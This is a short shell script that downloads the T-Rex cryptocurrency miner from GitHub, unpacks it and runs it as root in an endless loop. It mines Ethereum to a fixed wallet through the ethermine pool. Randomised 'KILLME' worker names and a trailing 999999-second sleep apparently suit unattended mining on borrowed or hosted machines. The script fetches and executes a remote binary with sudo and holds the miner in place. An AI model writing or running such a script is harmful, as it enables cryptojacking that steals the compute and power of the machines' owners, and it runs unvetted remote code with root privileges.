#!/bin/sh

wget https://github.com/trexminer/T-Rex/releases/t-rex-0.21.3-linux.tar.gz
tar -xvf t-rex-0.21.3-linux.tar.gz
chmod +x t-rex
while [ 1 ]; do
  sleep 5
  sudo ./t-rex -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0xD07b31e87Bf3892D9F6cA4a417ccACD439EC51Cc.$(echo $(shuf -i 1-10 -n 1)-KILLME) --intensity 20 --gpu-report-interval 10 --kernel 0 --dag-build-mode 0 --keep-gpu-busy
done
sleep 999999
